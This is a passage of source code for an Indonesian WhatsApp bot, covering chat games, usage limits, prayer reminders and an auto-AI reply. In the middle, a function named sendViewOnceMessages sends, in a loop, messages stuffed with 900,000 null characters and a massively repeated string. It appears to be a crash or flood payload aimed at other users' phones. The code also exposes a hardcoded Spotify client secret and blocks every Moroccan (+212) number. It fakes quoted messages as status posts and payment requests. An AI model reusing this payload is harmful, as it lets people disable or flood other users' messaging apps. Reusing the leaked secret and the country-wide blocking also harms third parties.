	    win = !roof.pilih ? roof.p2 : roof.p
	    Tan.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Tidak Memilih Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /Gunting/i
	    let b = /Batu/i
	    let k = /Kertas/i
	    let reg = /^(Gunting|Batu|Kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\n Menunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih2) Tan.sendText(roof.p2, '_Lawan telah memilih\kSekarang giliranmu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\n Menunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih) Tan.sendText(roof.p, '_ Lawan telah memilih\kSekarang giliranmu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    Tan.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return Tan.updateBlockStatus(m.sender, 'block')
}

//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return 
}
//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await Tan.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

const userDbPath = './database/limit.json'; // Path ke database user
// Baca database pengguna
function readUserDb() {
    if (!fs.existsSync(userDbPath)) {
        fs.writeFileSync(userDbPath, JSON.stringify({}), 'utf-8');
    }
    return JSON.parse(fs.readFileSync(userDbPath, 'utf-8'));
}

// Simpan database pengguna
function writeUserDb(data) {
    fs.writeFileSync(userDbPath, JSON.stringify(data, null, 2), 'utf-8');
}

// Periksa dan atur limit pengguna
function checkAndReduceLimit(m, isPrem, isTanOwner) {
    const sender = m.sender;
    const userDb = readUserDb();

    // Tambahkan pengguna baru ke database dengan limit default
    if (!userDb[sender]) {
        userDb[sender] = { limit: 50 };
    }

    const userLimit = userDb[sender].limit;

    // Pengecualian untuk owner dan premium user
    if (isTanOwner || isPrem) return true;

    // Beri notifikasi jika limit mencapai 5
    if (userLimit === 5) {
        reply('⚠️ Limit Anda hampir habis! Silakan hubungi owner untuk menambah limit.');
    }

    // Blokir akses jika limit habis
    if (userLimit <= 0) {
        reply('⚠️ Limit Anda telah habis. Silakan hubungi owner untuk menambah limit.');
        return false;
    }

    // Kurangi limit
    userDb[sender].limit -= 1;
    writeUserDb(userDb);

    return true;
}
async function sendTanMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Tan.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const replyTan = (teks) => {
Tan.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 100,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${global.botname}`,
"body": `${Tanwaktu} ${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://g.top4top.io/p_3315mdtvp0.jpeg',
"sourceUrl": 'https://whatsapp.com/channel/0029VahyeDI6BIEdqtqlXk1t'}}},
{ quoted: fkontak})
}

const reply = (teks) => {
Tan.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 100,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${global.botname}`,
"body": `${Tanwaktu} ${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://g.top4top.io/p_3315mdtvp0.jpeg',
"sourceUrl": 'https://whatsapp.com/channel/0029VahyeDI6BIEdqtqlXk1t'}}},
{ quoted: fkontak})
}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(900000)
            })
          })
        }
      }
    }, { quoted: fcall });
    Tan.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}
	async function sendButton(chat, judul, teks, button, m) {
			let msg = generateWAMessageFromContent(chat, {
				viewOnceMessage: {
					message: {
						'messageContextInfo': {
							'deviceListMetadata': {},
							'deviceListMetadataVersion': 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.create({
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 999999, 
								isForwarded: true, 
								forwardedNewsletterMessageInfo: {
									newsletterJid: saluran,
									newsletterName: saluranName, 
									serverMessageId: -1
								},
								businessMessageForwardInfo: { 
									businessOwnerJid: Tan.decodeJid(Tan.user.id) 
								},
							},
							body: proto.Message.InteractiveMessage.Body.create({
								text: teks
							}),
							footer: proto.Message.InteractiveMessage.Footer.create({
								text: botName
							}),
							header: proto.Message.InteractiveMessage.Header.create({
								title: judul,
								subtitle: ownerName,
								hasMediaAttachment: false
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
								buttons: button,
							})
						})
					}
				}
			}, { 
				quoted: m 
			})

			await Tan.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			})
		}

		
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return Tan.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return Tan.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)


const sendvn = (teks) => {
Tan.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: fcall })
}
async function getAccessToken() {
    try {
        const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
        const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
Tan.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await Tan.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}


const lep = {
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }
//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6285198468895:6285198468895\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./data/image/thumb.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await Tan.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Tan.getName(i)}\nFN:${await Tan.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${yt}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
// Pastikan variabel Tan.autoshalat telah diinisialisasi
Tan.autoshalat = Tan.autoshalat ? Tan.autoshalat : {};

// Daftar lokasi dengan zona waktu dan jadwal sholat yang diset secara manual
const locations = [
  { 
    name: "Jakarta", 
    timezone: "Asia/Jakarta", 
    jadwal: {            // Waktu sholat dalam format "HH:mm"
      shubuh: "04:30",
      dzuhur: "12:00",
      ashar: "15:00",
      magrib: "18:00",
      isya: "19:30"
    }
  },
  { 
    name: "Makassar", 
    timezone: "Asia/Makassar", 
    jadwal: {
      shubuh: "04:45",
      dzuhur: "12:15",
      ashar: "15:15",
      magrib: "18:15",
      isya: "19:45"
    }
  },
  { 
    name: "Jayapura", 
    timezone: "Asia/Jayapura", 
    jadwal: {
      shubuh: "04:50",
      dzuhur: "12:20",
      ashar: "15:20",
      magrib: "18:20",
      isya: "19:50"
    }
  }
];

// Fungsi untuk menjalankan auto-respon sholat secara manual
function setManualAutoSholat() {
  // Untuk setiap lokasi
  locations.forEach(loc => {
    // Setiap 60 detik (1 menit) periksa waktu di zona yang bersangkutan
    setInterval(() => {
      // Dapatkan waktu saat ini di zona waktu yang ditentukan
      const dateString = new Date().toLocaleString("en-US", { timeZone: loc.timezone });
      const now = new Date(dateString);
      const hours = now.getHours();
      const minutes = now.getMinutes();
      const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;

      // Periksa setiap waktu sholat yang telah di‑set secara manual untuk lokasi ini
      for (let [prayer, waktu] of Object.entries(loc.jadwal)) {
        if (timeNow === waktu) {
          // Cegah pengiriman pesan berulang dalam satu menit
          if (!(loc.name in Tan.autoshalat)) {
            // Kirim pesan menggunakan fungsi reply()
            reply(
              `🕌 *Pengingat Waktu Sholat* (${loc.name})\n` +
              `Saatnya salat *${prayer}* pukul ${waktu}.\n` +
              `Jangan lupa menunaikan sholat tepat waktu!`
            );

            // Tandai wilayah ini agar tidak mengirim ulang selama 60 detik
            Tan.autoshalat[loc.name] = setTimeout(() => {
              delete Tan.autoshalat[loc.name];
            }, 60000);

            console.log(`🔔 Pengingat ${prayer} (${waktu}) telah dikirim untuk ${loc.name}`);
          }
        }
      }
    }, 60000); // Cek setiap 60 detik (1 menit)
  });
}
if (!m.key.fromMe && db.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await Tan.readMessages([readkey]);
}

Tan.sendPresenceUpdate('available', m.chat)

if (global.autoTyping) {
if (command) {
Tan.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
Tan.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
//================================================================
if (automati) {
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}
if (shouldExit) {
    nodecron.schedule('0 */1 * * *', () => {
        fs.readdir("./session", async function (err, files) {
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
if(filteredArray.length == 0) return console.log(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
await filteredArray.forEach(function (file) {
});
await sleep(2000)
console.log("Berhasil menghapus semua Kenangan di folder session")    
});
    })
}
//=================================================================
if (!m.isGroup && !isTanOwner && db.settings[botNumber].onlygrub ) {
        	if (command){
            return replyTan(` Halo sobat! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !\n\nJika Anda mengalami masalah silakan chat pemilik wa.me/${ownernumber}`)
            }
        }
//=================================================================
async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum","assalamu'alaikum",].includes(budy) && !isCmd) {
let audio = {
    audio: {url: 'https://pomf2.lain.la/f/xe3qczl.mp3'},
    mimetype: 'audio/mp4',
    ptt: true,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: wm,
        body: 'RAFFX SALAM',
        sourceUrl: '',
        thumbnail: await (await Tan.getFile('https://telegra.ph/file/d6f44478fd2ece636755e.jpg')).data,
        renderLargerThumbnail: true
      }
    }
    }
  };
const prayerSchedule = {
  shubuh: "04:48",
  dzuhur: "12:26",
  ashar:  "15:29",
  magrib: "18:33",
  isya:   "19:44"
};

if (!global.lastPrayerReminder) {
  global.lastPrayerReminder = {};
}
const waktu = new Date();
const jam = waktu.getHours().toString().padStart(2, "0");
const menit = waktu.getMinutes().toString().padStart(2, "0");
const currentTime = `${jam}:${menit}`;
for (let [prayer, time] of Object.entries(prayerSchedule)) {
  if (currentTime === time && global.lastPrayerReminder[prayer] !== currentTime) {
    await reply(
      `*Sudah mendekati Waktu sholat*!\n` +
      `Bersiaplah untuk menunaikan kewajiban sebagai orang muslim untuk Sholat *${prayer.toUpperCase()}* pukul ${time}.\n` +
      `Jangan lupa untuk sholat tepat waktu`
    );
    global.lastPrayerReminder[prayer] = currentTime;
    break;
  }
}
//autoai
if (autoAiData.enabledChats.includes(m.chat)) {
    if (m.message && !m.key.fromMe) {
        try {
            const userInput = m.text;
            const menuImage = './data/image/arisu.jpg';
            const { aris } = require('./lib/ai');
            const axios = require('axios');
            const translate = require('translate-google-api');
            const { arisuVoice } = require('./scrape/model');
            const delay = (ms) => new Promise((res) => setTimeout(res, ms));
            const aiResponse = await aris(userInput);
            const translatedText = await translate(aiResponse, { to: 'ja', tld: 'com' }); // Terjemahkan respons ke bahasa Jepang
            const audioResponse = await arisuVoice(translatedText); // Konversi teks ke audio

            // Kirim pesan respons dalam bentuk teks dan gambar
            await Tan.sendMessage(m.chat, {
                image: { url: menuImage },
                caption: `🎓 *Arisu:*\n\n${aiResponse}`,
                mentions: [m.sender],
            });

            // Kirim respons dalam bentuk audio
            await Tan.sendMessage(m.chat, {
                audio: { url: audioResponse.result.url },
                mimetype: 'audio/mpeg',
                caption: `🎓 *Arisu:* ${aiResponse}`,
            });
        } catch (error) {
            console.error('Error Auto AI:', error.message);
            Tan.sendMessage(m.chat, {
                text: "⚠️ Maaf, terjadi kesalahan saat memproses permintaan Anda.",
            }, { quoted: m });
        }
    }
}

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}


 async function loading() {
 	reply(`Loading.... `)
     }

async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}


function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}


async function replyprem(teks) {
    reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}


if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Tan.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Tan.sendMessage(m.chat, {
  image: await getBuffer(get_data_respon.image_url),
  caption: get_data_respon.response, // Gantilah dengan teks yang sesuai
}, {
  quoted: m
})
}
}
//=========================================\\
//anti bad words by xeon
if (antiToxic)
if (BadTan.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isTanOwner) return reply(bvl)
        await Tan.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await 
Tan.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, { quoted: fcall })}
}

Tan.family100 = Tan.family100 ? Tan.family100 : {};
if (from in Tan.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; // semakin tinggi nilai, semakin mirip
    let id = m.chat;
    let users = global.db.users[m.sender];
    let room = Tan.family100[id];
    let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '');
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);
    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);
        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return replyTan('Dikit lagi!');
            }
        }
        if (!isCmd && room.terjawab[index]) {
            return;
        }
        users.money += room.winScore;
        room.terjawab[index] = m.sender;
    }
    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;
    let caption = `*GAME FAMILY100*
*Soal:* ${room.soal}
Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}
${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
    `.trim();
    Tan.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: fcall }).then(msg => {
        Tan.family100[id].msg = msg;
    }).catch(_ => _);
    if (isWin || isSurrender) {
        delete Tan.family100[id];
    }
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   Tan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, { quoted: fcall }) 
 delete tebaklagu[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

Tan.tebakkata = Tan.tebakkata ? Tan.tebakkata : {}  
if (from in Tan.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(Tan.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n`
 replyTan(`${teks}`)
 clearTimeout(Tan.tebakkata[id][2])
 delete Tan.tebakkata[id]
} else console.log('*Jawaban Salah!*')
}
Tan.tebakgambar = Tan.tebakgambar ? Tan.tebakgambar : {} 
if(from in Tan.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(Tan.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n\nIngin bermain lagi? Silahkan Ketik TebakGambar`
 replyTan(`${teks}`)
 clearTimeout(Tan.tebakgambar[id][3])
 delete Tan.tebakgambar[id]
} else console.log('*Jawaban Salah!*')
}

if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyTan('*Anda Telah menyerah*')
delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await Tan.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }

if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyTan('*Anda Telah menyerah*')
delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await Tan.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }

 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
